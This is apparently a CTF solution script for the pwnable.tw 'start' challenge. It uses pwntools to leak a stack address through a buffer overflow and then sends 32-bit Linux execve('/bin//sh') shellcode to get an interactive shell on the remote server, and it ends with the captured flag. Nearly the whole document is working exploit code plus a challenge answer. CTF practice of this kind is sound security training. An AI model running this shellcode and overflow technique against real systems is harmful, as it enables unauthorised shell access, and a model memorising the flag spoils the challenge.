#!/usr/bin/python3

from pwn import *


# set the context of the target platform
# arch: i386 (x86 32 bit)
# os: linux
# context.update(arch='i386')

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

# payload = cyclic(cyclic_find(0x61616166))
payload = b'A'*20
payload += p32(0x08048087)

# create a process
# p = process("./start")
p = remote('chall.pwnable.tw',10000)

input('[+] Attach GDB')

# send input to the program with a newline char, "\n"
# cyclic(50) provides a cyclic string with 50 chars
p.read()
p.send(payload)

esp_addr = unpack(p.read()[:4])


print("esp_addr: {}".format(hex(esp_addr)))

# payload = cyclic(cyclic_find(0x61616166))
payload = b'B'*20
payload += p32(esp_addr + 20)

payload += shellcode

print("len_payload: {}".format(len(payload)))
p.send(payload)



# make the process interactive, so you can interact
# with the process via terminal
p.interactive()
# 0xffa8af4c

# flag: FLAG{Pwn4bl3_tW_1s_y0ur_st4rt} 